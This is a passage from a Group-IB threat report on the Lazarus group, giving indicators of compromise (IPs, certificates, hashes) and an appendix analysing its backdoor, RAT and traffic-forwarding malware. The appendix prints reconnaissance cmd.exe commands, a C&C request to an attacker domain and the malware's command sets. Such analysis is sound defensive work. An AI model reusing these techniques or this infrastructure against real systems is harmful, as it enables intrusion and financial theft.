was, or is, under attack by <THREAT_ACTOR>Lazarus</THREAT_ACTOR>. The group uses legitimate compromised 
servers, that’s why these indicators can give false positives.

Response

And the most important thing: if you have detected trails of a targeted attack 
at any stage, you need to involve specialized companies for its analysis. 
Incorrect responses to the attack result in the attacker activity remaining 
partly undetected to enable criminals to achieve their goal — to steal money.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution19

ABOUT  
<ORG>Group-IB</ORG>

<ORG>Group-IB</ORG> is one of the global leaders in preventing and investigating high-
tech crimes and online fraud. <TIMESTAMP>Since 2003</TIMESTAMP>, the company has been active in the 
field of computer forensics and information security, protecting the largest 
international companies against financial losses and reputational risks.

 
International honors

The company is recognized by <ORG>Gartner</ORG> as a threat intelligence vendor with 
strong cyber security focus and the ability to provide leading insight to the 
Eastern European region and recommended by the <ORG>Organization for Security and Co-operation in Europe</ORG> (<ORG>OSCE</ORG></ORG>). In <TIMESTAMP>2017</TIMESTAMP> <ORG>IDC</ORG> Report named <ORG>Group-IB</ORG> the 
leader of the Russian Threat Intelligence Services Market. The company is a 
member of the <ORG>World Economic Forum</ORG> working group on cybersecurity.

 
Clients worldwide

Fortune 500 companies worldwide use <ORG>Group-IB</ORG> products and services. 
<ORG>Group-IB</ORG> clients include top-tier <INDUSTRY>banks</INDUSTRY> and <INDUSTRY>financial</INDUSTRY> institutions, <INDUSTRY>FMCG brands</INDUSTRY> 
and industrial corporations, <INDUSTRY>oil</INDUSTRY> and <INDUSTRY>gas</INDUSTRY> companies, software and hardware 
vendors, <INDUSTRY>telecommunications</INDUSTRY> service providers the <COUNTRY>US</COUNTRY>, <COUNTRY>Western Europe</COUNTRY>, the 
<COUNTRY>Middle East</COUNTRY>, <COUNTRY>Asia</COUNTRY> and <COUNTRY>Australia</COUNTRY>.

 
CyberCrimeCon2017

Annual conference organized by <ORG>Group-IB</ORG> aims to empower global threat 
intelligence exchange in one of the hottest spot on cybersecurity map. Be the 
first to discover key cybercrime trends and get a chance to interact with the 
global experts directly, both on and off stage.  
Learn more on 2017.group-ib.com



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution20

<SOFTWARE>Threat Intelligence</SOFTWARE>

Learn about threats, leakages, 
attacks, and hacking activity 
before they can harm your 
business

<SOFTWARE>TDS Sensor</SOFTWARE>  
+ <SOFTWARE>TDS Polygon</SOFTWARE>

Detect malicious incidents in 
your internal network to prevent 
attacks, intrusions, data leaks, and 
espionage

<SOFTWARE>Incident Response</SOFTWARE>

CERT-GIB — 24/7 emergency 
response and effective incident 
management

<SOFTWARE>Secure Bank</SOFTWARE>

Protect online payments by 
identifying fraud preparation and 
attempted execution on client 
devices

<SOFTWARE>Brand Protection</SOFTWARE>

Prevent online brand abuse, 
manage reputational risks and 
reduce online counterfeit sales

<SOFTWARE>Computer Forensics and Investigation</SOFTWARE>

The largest computer forensics 
laboratory in <COUNTRY>Eastern Europe</COUNTRY> with 
150+ successful investigations 
worldwide

<ORG>Group-IB</ORG> products and services

Learn more on group-ib.com



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution21

5.1 IP addresses of attackers

5.2  IP addresses with  
<TOOL>SoftEther VPN</TOOL>

INDICATORS  
OF COMPROMISE

IP Country Comment

<IOC>175.45.178.222</IOC> <COUNTRY>North Korea</COUNTRY> Potonggang District, where <ORG>Natinal Defence Commission</ORG> 
of <COUNTRY>North Korea</COUNTRY> is located

<IOC>210.52.109.22</IOC> <COUNTRY>North Korea</COUNTRY> Located in the network of <ORG>China Netcom</ORG>

<IOC>157.7.135.182</IOC> <COUNTRY>Japan</COUNTRY> VPN server with an agent <TOOL>SoftEther VPN</TOOL>
<ORG>Japan Network Information Center</ORG> installed

<IOC>202.101.36.45</IOC> <COUNTRY>China</COUNTRY> VPN server with an agent <TOOL>SoftEther VPN</TOOL>
<ORG>Shanghai Telecom</ORG> installed

IP Country Certificate name Comments

<IOC>157.7.135.182</IOC> <COUNTRY>Japan</COUNTRY> vpn140818026.softether.net <ORG>Japan Network Information Center</ORG>

<IOC>202.101.36.45</IOC> <COUNTRY>China</COUNTRY> vpn421337203.sedns.cn <ORG>Shanghai Telecom</ORG>

<IOC>202.129.24.4</IOC> <COUNTRY>Thailand</COUNTRY> vpn334555897.softether.net <ORG>CAT-Northeast Telecom</ORG>

<IOC>78.89.183.37</IOC> <COUNTRY>Kuwait</COUNTRY> vpn401107085.softether.net <ORG>Wataniya Telecom</ORG></OR>

<IOC>31.3.225.57</IOC> <COUNTRY>USA</COUNTRY> vpn204475098.softether.net Dedicated server hosting

<IOC>207.162.24.86</IOC> <COUNTRY>Canada</COUNTRY> vpn311153980.softether.net <ORG>Universite du Quebec</ORG>

<IOC>209.254.82.137</IOC> <COUNTRY>USA</COUNTRY> vpn835666623.softether.net <ORG>PaeTec Communications, Inc. TELECOM</ORG>

<IOC>77.241.47.234</IOC> <COUNTRY>Russia</COUNTRY> vpn656325103.softether.net <ORG>tvoe.tv</ORG>

<IOC>173.198.127.221</IOC> <COUNTRY>USA</COUNTRY> vpn154284736.softether.net <ORG>Warner Bros. Entertainment Inc</ORG>

<IOC>180.18.169.69</IOC> <COUNTRY>Japan</COUNTRY> vpn839766209.softether.net <ORG>Japan Network Information Center</ORG>

<IOC>31.197.217.5</IOC> <COUNTRY>Italy</COUNTRY> vpn844692605.softether.net <ORG>Telecom Italia S.p.a.</ORG>

<IOC>140.123.92.101</IOC> <COUNTRY>Taiwan</COUNTRY> vpn147623034.softether.net <ORG>Taiwan Network Information Center</ORG>

<IOC>140.121.120.229</IOC> <COUNTRY>Taiwan</COUNTRY> vpn178828146.softether.net <ORG>Taiwan Network Information Center</ORG>

05

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution22

5.3 IP addresses used to control the C&C infrastructure

IP addresses of compromised  
hosts with <MALWARE>ServerRAT</MALWARE>
Listens on port 3365

IP addresses of 
compromised hosts 
with PortForwarder
Redirects to port 443

IP addresses of compromised 
hosts with <MALWARE>Backend_Listener</MALWARE>
Listens on ports 8080 and 
9090

<IOC>140.121.120.229</IOC>

<IOC>27.131.59.198</IOC>

<IOC>194.78.90.21</IOC>

<IOC>140.123.92.101</IOC>

<IOC>31.210.105.105</IOC>

<IOC>31.197.217.5</IOC>

<IOC>182.77.60.35</IOC>

<IOC>203.131.230.104</IOC>

<IOC>80.60.105.128</IOC>

<IOC>203.114.109.68</IOC>

<IOC>165.123.67.111</IOC>

<IOC>178.222.166.209</IOC>

<IOC>140.114.122.178</IOC>

<IOC>63.247.182.137</IOC>

<IOC>140.121.100.63</IOC>

<IOC>114.174.228.100</IOC>

<IOC>202.183.185.90</IOC>

<IOC>118.189.38.21</IOC>

<IOC>203.66.57.237</IOC>

<IOC>210.227.170.229</IOC>

<IOC>180.18.169.69</IOC>

<IOC>173.198.127.221</IOC>

<IOC>86.120.134.50</IOC>

<IOC>77.241.47.234</IOC>

<IOC>182.73.40.130</IOC>

<IOC>58.64.203.66</IOC>

<IOC>81.93.72.18</IOC>

<IOC>61.122.232.25</IOC>

<IOC>209.254.82.137</IOC>

<IOC>118.22.154.159</IOC>

<IOC>207.162.24.86</IOC>

<IOC>178.252.148.240</IOC>

<IOC>212.14.44.245</IOC>

<IOC>210.213.80.237</IOC>

<IOC>180.234.11.19</IOC>

<IOC>51.254.71.167</IOC>

<IOC>41.41.241.194</IOC>

<IOC>31.3.225.57</IOC>

<IOC>69.91.178.16</IOC>

<IOC>180.94.69.107</IOC>

<IOC>218.29.194.101</IOC>

<IOC>140.119.98.20</IOC>

<IOC>64.116.135.73</IOC>

<IOC>140.115.31.220</IOC>

<IOC>78.89.183.37</IOC>

<IOC>221.132.18.43</IOC>

<IOC>190.252.8.138</IOC>

<IOC>31.210.119.142</IOC>

<IOC>61.90.156.121</IOC>

<IOC>212.34.228.66</IOC>

<IOC>196.214.247.58</IOC>

<IOC>12.49.13.202</IOC>

<IOC>41.72.101.138</IOC>

<IOC>60.96.139.113</IOC>

<IOC>80.78.73.204</IOC>

<IOC>212.30.75.210</IOC>

<IOC>87.252.182.182</IOC>

<IOC>166.111.80.223</IOC>

<IOC>140.116.31.195</IOC>

<IOC>24.201.106.142</IOC>

<IOC>41.33.212.94</IOC>

<IOC>31.192.208.227</IOC>

<IOC>193.19.174.60</IOC>

<IOC>220.132.243.188</IOC>

<IOC>69.196.83.206</IOC>

<IOC>62.210.146.3</IOC>

<IOC>208.124.153.14</IOC>

<IOC>140.112.90.235</IOC>

<IOC>47.176.2.12</IOC>

<IOC>164.70.22.40</IOC>

<IOC>211.240.78.135</IOC>

<IOC>202.56.120.210</IOC>

<IOC>184.163.74.15</IOC>

<IOC>210.241.42.173</IOC>

<IOC>218.248.46.26</IOC>

<IOC>12.49.13.202</IOC>

<IOC>31.210.105.105</IOC>

<IOC>202.129.24.4</IOC>

<IOC>210.213.90.173</IOC>

<IOC>187.109.80.61</IOC>

<IOC>212.219.35.51</IOC>

<IOC>203.131.230.104</IOC>

<IOC>2.32.113.178</IOC>

<IOC>187.44.139.252</IOC>

<IOC>123.200.9.178</IOC>

<IOC>82.144.131.5</IOC>

<IOC>202.183.185.91</IOC>

<IOC>209.105.239.42</IOC>

<IOC>209.81.121.51</IOC>

<IOC>140.115.31.220</IOC>

<IOC>80.78.73.204</IOC>

<IOC>140.115.42.147</IOC>

<IOC>212.14.44.245</IOC>

<IOC>165.123.67.111</IOC>

<IOC>66.207.112.187</IOC>

<IOC>203.66.57.237</IOC>

<IOC>140.116.178.123</IOC>

<IOC>140.116.31.195</IOC>

<IOC>140.112.14.16</IOC>

<IOC>202.183.185.90</IOC>

<IOC>41.72.101.138</IOC>

<IOC>59.120.19.101</IOC>

<IOC>125.214.195.17</IOC>

<IOC>69.196.83.206</IOC>

<IOC>175.45.61.44</IOC>

<IOC>31.192.208.xxx</IOC>



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution23

Certificate thumbprint “Issued for” Field Issue date IP addresses where 
the certificate was 
detected

<IOC>de8166daca44cca2ef26031fd8a489222d8fa74c</IOC>

www.longmusic.com/emailAddress=master@longmusic.com

<TIMESTAMP>2017-02-09</TIMESTAMP> <IOC>12.49.13.202</IOC>
<IOC>31.210.105.105</IOC>

<IOC>b82ce23ef56fd59df2d54cd6ab0d097ec38a72bb</IOC>

www.comtech.com/emailAddress=master@comtech.com

<TIMESTAMP>2016-11-27</TIMESTAMP> <IOC>187.44.139.252</IOC>

<IOC>1f2ae52ccf5ace9a27f521043816f8ca02405779</IOC>

www.fartit.com/emailAddress=master@fartit.com

<TIMESTAMP>2016-11-08</TIMESTAMP> <IOC>210.213.90.173</IOC>
<IOC>187.109.80.61</IOC>
<IOC>212.219.35.51</IOC>

<IOC>6e55459ddbc666e5d6f89844f5d2a2647be426ca</IOC>

www.wikaba.com/emailAddress=master@wikaba.com

<TIMESTAMP>2016-11-07</TIMESTAMP> <IOC>202.129.24.4</IOC>

<IOC>d35da9d13883b3f0c575144b3cee58d5744a9e48</IOC>

www.telecomm.com/emailAddress=consult@www.telecom.com

<TIMESTAMP>2016-11-07</TIMESTAMP> <IOC>203.131.230.104</IOC>

<IOC>6bab9ca99fcdd465a56463a65122f9e7ba367219</IOC>

www.instanthq.com/emailAddress=master@instanthq.com

<TIMESTAMP>2016-11-01</TIMESTAMP> <IOC>2.32.113.178</IOC>

<IOC>a8b0b4f42547aaf608f062c6f9aa1e3fb33caaf0</IOC>

tradeboard.mefound.com/emailAddress=master@mefound.com

<TIMESTAMP>2016-10-21</TIMESTAMP> <IOC>82.144.131.5</IOC>
<IOC>202.183.185.91</IOC>

<IOC>c84c214878ebbee35d853cb2f739f919238550a4</IOC>

www.biolab.com/emailAddress=master@biolab.com

<TIMESTAMP>2016-10-03</TIMESTAMP> <IOC>123.200.9.178</IOC>

<IOC>935192f61d0a72cc24d01feab5a18de9a3837b42</IOC>

www.resfinan.com/emailAddress=info@resfinan.com

<TIMESTAMP>2016-08-18</TIMESTAMP> <IOC>209.105.239.42</IOC>
<IOC>209.81.121.51</IOC>
<IOC>182.77.60.35</IOC>
<IOC>80.78.73.204</IOC>
<IOC>140.115.31.220</IOC>
<IOC>140.115.42.147</IOC>

<IOC>26b4162e29de9c4a64b4dfd93b72c6426bc9dc8e</IOC>

finews.otzo.com/emailAddress=master@otzo.com

<TIMESTAMP>2016-04-10</TIMESTAMP> <IOC>41.72.101.138</IOC>
<IOC>202.183.185.90</IOC>
<IOC>140.112.14.16</IOC>
<IOC>140.116.31.195</IOC>
<IOC>140.116.178.123</IOC>
<IOC>203.66.57.237</IOC>
<IOC>66.207.112.187</IOC>
<IOC>165.123.67.111</IOC>
<IOC>212.14.44.245</IOC>
<IOC>106.2.44.86</IOC>

<IOC>f1f7c47c154a3f95cbc41a3299ce80a45e566519</IOC>

host.global.com/emailAddress=info@host.global.com

<TIMESTAMP>2016-03-21</TIMESTAMP> <IOC>69.196.83.206</IOC>
<IOC>175.45.61.44</IOC>

<IOC>57cfdf9b1e3a3675e5a971e1905f1ca5afd228bf</IOC>

latest.ignorelist.com/emailAddress=consult@latest.ignorelist.com

<TIMESTAMP>2016-03-03</TIMESTAMP> <IOC>59.120.19.101</IOC>
<IOC>125.214.195.17</IOC>

5.4  Certificates used  
to redirect traffic

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution24

Hash Malware type File names

<IOC>4cc10ab3f4ee6769e520694a10f611d5</IOC> <MALWARE>SilverLight exploit</MALWARE>  <IOC>cambio.xap</IOC>

<IOC>6dffcfa68433f886b2e88fd984b4995a</IOC>
<IOC>1f2cd85583a4a56b764ba6429c2155ec</IOC>

<MALWARE>Flash exploit</MALWARE>  <IOC>cambio.swf</IOC>

<IOC>cb52c013f7af0219d45953bae663c9a2</IOC>
<IOC>9216b29114fb6713ef228370cbfe4045</IOC>

<MALWARE>Reconnaissance module</MALWARE> <IOC>svchost.exe</IOC>

<IOC>1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae</IOC> <MALWARE>Dropper</MALWARE> <IOC>gpsvc.exe</IOC>

<IOC>85d316590edfb4212049c4490db08c4b</IOC>
<IOC>1f7897b041a812f96f1925138ea38c46</IOC>
<IOC>1507e7a741367745425e0530e23768e6</IOC>

<MALWARE>Dropper</MALWARE> <IOC>MBLCTR.EXE</IOC>
<IOC>gpsvc.exe</IOC>

<IOC>9914075cc687bdc352ee136ac6579707</IOC> <MALWARE>Loader</MALWARE> <IOC>fdsvc.exe</IOC>

<IOC>9cc6854bc5e217104734043c89dc4ff8</IOC> <MALWARE>Client_TrafficForwarder</MALWARE> <IOC>fdsvc.dll</IOC>

<IOC>25200d3fe30785f3c90a91faf8ebf1b5</IOC>
<IOC>5994a8fd8c68dd1cc51ce7ca0d9c2749</IOC>
<IOC>889e320cf66520485e1a0475107d7419</IOC>
<IOC>40e698f961eb796728a57ddf81f52b9a</IOC>

<MALWARE>Client_TrafficForwarder</MALWARE>

<IOC>8e32fccd70cec634d13795bcb1da85ff</IOC> <MALWARE>Client_RAT</MALWARE> <IOC>srservice.hlp</IOC>

<IOC>e29fe3c181ac9ddbb242688b151f3310</IOC> <MALWARE>Client_RAT</MALWARE> <IOC>deskadp.dll</IOC> 
<IOC>srservice.dll</IOC>

<IOC>9216b29114fb6713ef228370cbfe4045</IOC> <MALWARE>Client_RAT</MALWARE> <IOC>srservice.chm</IOC>

<IOC>570e6ea21cdce694a4a74876ca87534a</IOC> <MALWARE>ServerRAT</MALWARE> <IOC>ejbss.dll</IOC>

<IOC>e4fb05a8c2da92ec5b19bdb59814464a</IOC> <MALWARE>ServerRAT</MALWARE> <IOC>mbcrs.rll</IOC>

<IOC>f38f6d976e6d66abc86f9992e808670a</IOC> <MALWARE>ServerRAT</MALWARE> <IOC>smtp.dat</IOC>

<IOC>3c3982d068bc7f2d1e4742c2009b0f46</IOC> <MALWARE>Server_TrafficForwarder</MALWARE> <IOC>msvmgr.exe</IOC>

<IOC>b603a16a950056df336fe3950c81601d</IOC>
<IOC>d032aeb54cf1229e011c070ecd64c33e</IOC>

<MALWARE>Server_TrafficForwarder</MALWARE> <IOC>msdtc.exe</IOC>

<IOC>5C1917F6753D03A08328132DB1E06571</IOC> <MALWARE>BACKEND_LISTENER</MALWARE> <IOC>msdtc.exe</IOC>

5.5  Malware



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution25

APPENDIX06

<MALWARE>RECON</MALWARE> module

The <IOC>svchost.exe</IOC> file (MD5 <IOC>cb52c013f7af0219d45953bae663c9a2</IOC>, size 128512 
bytes) is a <MALWARE>Backdoor</MALWARE>. This program is installed and launched on the target 
machine through successful execution of exploits.

Once launched, the program adds itself to the auto-start by copying its file to the 
directory “%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\
Programs\Startup”, collects information about the infected machine and sends it 
to the C&C server.

In addition, it can download and run third-party programs. The following 
commands are executed using a command interpreter:

«cmd.exe /c \»hostname > %s\»», &TempFileName);

«cmd.exe /c \»whoami >> %s\»», &TempFileName);

«cmd.exe /c \»ver >> %s\»», &TempFileName);

«cmd.exe /c \»ipconfig -all >> %s\»», &TempFileName);

«cmd.exe /c \»ping www.google.com >> %s\»», &TempFileName);

«cmd.exe /c \»query user >> %s\»», &TempFileName);

«cmd.exe /c \»net user >> %s\»», &TempFileName);

«cmd.exe /c \»net view >> %s\»», &TempFileName);

«cmd.exe /c \»net view /domain >> %s\»», &TempFileName);

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution26

exe /c \»reg query \»HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet 
Settings\» >> %s\»»,

«cmd.exe /c \»tasklist /svc >> %s\»», &TempFileName);

«cmd.exe /c \»netstat -ano | find \»TCP\» >> %s\»», &TempFileName);

}

The analyzed sample can download and run executable files on 
command from the C&C server (the ""http"" command). The ""killkill"" 
command, used for self-removal from the infected system, applies a 
hard-coded name of a .BAT file ""<IOC>%temp%\tmp095j.bat</IOC>"". 

An example of a request to the C&C server is shown below:

GET /design/dfbox/list.jsp?action=What&u=10729854751740 HTTP/1.1

Connection: Keep-Alive

User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 
Firefox/47.0

Host: www.eye-watch[.]in

Below is a code block with a command request sent to the C&C 
server:

Command Description

killkill Remove itself from the system

http Download and run the file from the C&C server



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution27

Below is a code block informing the C&C server about the results of 
file loading and execution commands:

Below is a code block informing the C&C server about the results of 
self-removal commands:

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution28

Below is a code block informing the C&C server about results of the 
data system collection command: 

This remote control tool is installed on command from <MALWARE>RECON</MALWARE>, in the 
event the computer is of interest to the attacker. The application is 
deployed as follows: <MALWARE>Dropper</MALWARE> -> <MALWARE>Loader</MALWARE> -> <MALWARE>Payload</MALWARE>.

The <IOC>gpsvc.exe</IOC> file (MD5: <IOC>1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae</IOC>, size: 
3449344 bytes) is an executable file and can be classified as <MALWARE>Dropper</MALWARE>. 
This file is downloaded on the target system using <MALWARE>RECON</MALWARE>. 

This console utility can be launched with the following arguments:

<MALWARE>Client_RAT</MALWARE>

Arguments Description

<IOC>gpsvc.exe</IOC> -l Enumerates system services

<IOC>gpsvc.exe</IOC>  -e [path] Extracts and decrypts the payload and saves it to the 
specified path

<IOC>gpsvc.exe</IOC> –a [service name] 
[path to DLL]

Installs the library as a service 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution29

The <IOC>deskadp.dll</IOC> and <IOC>srservice.dll</IOC> files (MD5: <IOC>e29fe3c181ac9ddbb242688b151f3310</IOC>, size: 79360 bytes) are executable dynamic libraries and 
can be classified as <MALWARE>Loader</MALWARE>. These files are downloaded on the target 
system using <MALWARE>RECON</MALWARE> and can ensure its persistence in the system using 
<MALWARE>Dropper</MALWARE>.

<MALWARE>Loader</MALWARE> is used to decrypt <MALWARE>Payload</MALWARE>. The encrypted file named 
<IOC>srservice.chm</IOC> (MD5: <IOC>9216b29114fb6713ef228370cbfe4045</IOC>) is a <MALWARE>RAT</MALWARE>, 
which is saved (in encrypted form) to the directory “%windir%\Help\X.
chm”, where X is the name of the RAT file without an extension.

An additional file named <IOC>srservice.hlp</IOC> (MD5: <IOC>8e32fccd70cec634d13795bcb1da85ff</IOC>) is a RAT configuration file, which contains a C&C address 
embedded in an encrypted form.

The decrypted configuration file contains the following network 
addresses:

• <IOC>tradeboard.mefound.com</IOC>:443

• <IOC>movis-es.ignorelist.com</IOC>:443

In addition to configuration data, the file contains a built-in encrypted 
network address of the <IOC>tradeboard.mefound.com</IOC>:443 node.

The strings are encrypted with a simple XOR operation of every 
subsequent 2 bytes with a constant 0x2CDF.

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution30

Below is the buffer with the result of strings’ decryption.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution31

The application provides an option to specify the second network 
node, however it was not specified in the file identified and analyzed by 
<ORG>Group-IB</ORG> specialists.

After its launch, <IOC>srservice.dll</IOC> scans the % windir%\Help\ directory for a 
file with the same name, but with the .chm extension, then decrypts and 
injects it into the address space of the lsass.exe process.

Following this, the infected computer is controlled through a pre-
installed infrastructure with several layers of anonymization designed to 
complicate investigation.

The <MALWARE>RAT</MALWARE> contains usual commands in English. Communications with the 
C&C server are performed over an encrypted SSL channel as the <MALWARE>Client_RAT</MALWARE> is compiled with statically linked libcurl libraries, version 7.47.1 (<TIMESTAMP>FEB 2016</TIMESTAMP>).

This program may execute the following commands received from the 
C&C server: 

Command Description

NONE Do not execute any commands

GINF Collects and sends extensive system information about the PC

SLEP Do not execute any commands

HIBN Do not execute any commands

DRIV Get information about available disks in the system

DIRP List files with the specified extension

CHDR Changes the current directory

RUNX Get the user's token

MOVE Renames the specified file

FTIM Set the timestamps of the %windir%/system32/kernel32.dll file to the 
specified file

NEWF Create a new directory with the specified name

ZDWN Purportedly, downloads a file/files

PEIN Inject the code in the specified process

TCON Purportedly, it connects to the specified network node

DIR Enumerates files in the selected directory

DIE Remove itself from the system

DEL Delete the selected file

WIPE Delete the selected file and make it unrecoverable

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution32

Arguments Description

<IOC>dropper.exe</IOC> -x [key] -l Enumerates system services

<IOC>dropper.exe</IOC> -x [key] -e 
[servicename] [config]

Extracts and decrypts the payload from config and sets it as a service

<IOC>dropper.exe</IOC> -x [key] -f Installs implants by adding information about them to the system 
registry

<IOC>dropper.exe</IOC> -x [key] -o 
[eventname]

Calls OpenEventA with a special event name

<IOC>dropper.exe</IOC> -x [key] -t 
[eventname]

Calls OpenEventA with a special event name, then calls Setvent API

UPLD Upload the file to the C&C server

SCFG Get a new bot configuration

DRIV List the installed drivers

DOWN Download and run the file

CMDL Execute the command and upload the result of its operation to the C&C 
server

GCFG Download bot configuration

RUN Run the command

PVEW List running processes

PEEX Inject the code in the explorer.exe process.

PKIL Terminate the process with the selected PID

<MALWARE>Client_TrafficForwarder</MALWARE>

This program is designed to provide access to the local network and is also 
installed using the original <MALWARE>Dropper</MALWARE>. The installation scheme is as follows: 
<MALWARE>Dropper</MALWARE> -> <MALWARE>Loader</MALWARE> -> <MALWARE>Loader</MALWARE> -> <MALWARE>Payload</MALWARE>.

The <IOC>gpsvc.exe</IOC> and <IOC>MBLCTR.EXE</IOC> files (size: 753664 bytes, MD5: <IOC>85d316590edfb4212049c4490db08c4b</IOC>) are executable files and can be classified as <MALWARE>Loader</MALWARE>. 
This file is installed on the target system using <MALWARE>Dropper</MALWARE>, which is downloaded 
using <MALWARE>RECON</MALWARE> or <MALWARE>Client_RAT</MALWARE>.  

This console can be launched with the following arguments:

• Key means an encryption key. A MD5 hash (hashing algorithm) of this key is used to 
decrypt the configuration file.

• Config means a path to the configuration file that contains the name of the service, its 
description, and the loader of the main module, which will be installed on the system as 

a service.



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution33

The program can also read executable data from the following registry keys 
and embed them into the selected process: 

• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\
Security\Data2

• HKLM\SYSTEM\CurrentControlSet\Services\<name of service>\
Security\Data3

<IOC>fdsvc.exe</IOC> (MD5 <IOC>9914075cc687bdc352ee136ac6579707</IOC> and 60928 bytes) is an 
executable file and can be classified as <MALWARE>Loader</MALWARE>.

Example of the <MALWARE>Loader</MALWARE> launch:

<IOC>loader.exe</IOC> -d ""encrypted_payload.bin"" -p 1540 -s 
[encrypted_C&C:port] -r [encrypted_commands]

<MALWARE>Loader</MALWARE> is used to decrypt payload. The file named <IOC>fdsvc.dll</IOC> (MD5: <IOC>9cc6854bc5e217104734043c89dc4ff8</IOC>, size: 480768 bytes) is an encrypted 
payload which is <MALWARE>Client_TrafficForwarder</MALWARE>.

After decryption, it becomes a simple DLL (MD5 <IOC>25200d3fe30785f3c90a91faf8ebf1b5</IOC>, size: 519392 bytes) and is used to create a tunnel from 
the C&C server to the specified network resource. The payload provides 
a secure connection over a specially created protocol via a proxy server 
(an infected current host).

Description

The payload was compiled statically with the libcurl library, version 
7.49.1 (<TIMESTAMP>May 30, 2016</TIMESTAMP>), LibTomMath, and the libgcrypt library to support 
encrypted TLS traffic.

 

Arguments Description

-d Name of the file for decryption

-p ID of the process in which the payload should be embedded

-r Encrypted param1

-s Encrypted param2

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution34

Some constants from the libgcrypt library are presented below:

After decoding arguments (the arguments that were passed to the second 
stage module), the payload gets an IP address and a port of the C&C server. 
The payload communicates with the C&C server using a specific encryption 
protocol at the application level. 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution35

If the remote host is specified, then the connection is performed to this node. 
As has been mentioned, the sample body contains several Russian words in 
transliteration:

""Nachalo"" is a debugging string that will be sent in encrypted format to the 
C&C server, indicating that a connection to the target node is established. 
When executing a thread, 5 attempts are made to connect to the C&C server 
directly. The program will shut down if the connection fails. In the event the 
connection is successful, the application receives commands from the C&C 
server and executes them. All commands and server responses are encrypted 
by default, but for your convenience, they are listed below in decrypted form.

The main purpose of connecting to the C&C server is to receive (or send) 
encrypted content from the server to the target machine. The connection 
to the C&C server is performed to the network address and port that are 
specified as command-line arguments when the sample is launched (by 
<MALWARE>Loader</MALWARE>).

4  Recommendations1   Key  
Findings 

2   Attack  
preparation and 
implementation

3   Attack  
organizers

5  Indicators of 
compromise

6 Appendix 



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution36

Below is a list of available commands: 

By sending the ""ssylka"" message to the C&C server, the analyzed file can 
make the C&C server keep the connection open for further traffic redirection 
between the C&C server and Layer 1. The ""ssylka"" command is executed 
in the event the ""pereslat"" command is received from the C&C server. This 
means that the C&C server initiates the communication session by sending the 
«pereslat» command and waits for the incoming connection from the program 
(with the ""ssylka"" message) to further forward traffic between the C&C server 
and Layer 1 (communications are possible in both directions). The sample 
does not have a list of commands to forward traffic between the C&C server 
and Server2, it just redirects data from the one socket to another, when two 
connections are active.

One of the commands that can be received from the C&C server is 
«ustanavlivat». In the event the program receives it, it performs an additional 
request to the C&C server and receives a network address of the Server2 
node, which will be further used as an end point to proxy network traffic. 

The ""kliyent2podklyuchit"" message is intended to check the efficiency 
of an intermediate proxy server, through which network connections 
will be performed. If the target computer is specified in the command 
line, the sample will connect to this host with an additional message 
""kliyent2podklyuchit"". The connection is performed using the functionality of 
the statically linked library “libcurl”. In the event the connection is successful, 
traffic from the C&C server will further go through the proxy. If not, the 
application terminates its operation.

Command Description

ustanavlivat to receive a network address 
of the active Server2 server 
from the C&C server (the 
address will be sent in the next 
package)

poluchit to send a network address of 
the current Layer 2 server to 
the C&C server

pereslat to forward data between the 
C&C server and Server2

derzhat to keep the connection open

vykhodit to terminate the session

Command Description

Nachalo This message sent to the C&C 
server or the proxy during 
the start of the sample is the 
start-up indicator

kliyent2podklyuchit a testing proxy performance 
package

ssylka to connect to the С&C server 
to forward traffic between the 
C&C server and Server2

vykhodit notifying the C&C server of 
session termination

Commands from the C&C server Messages to the C&C server



<THREAT_ACTOR>Lazarus</THREAT_ACTOR> arisen:  
architecture, tools, attribution37

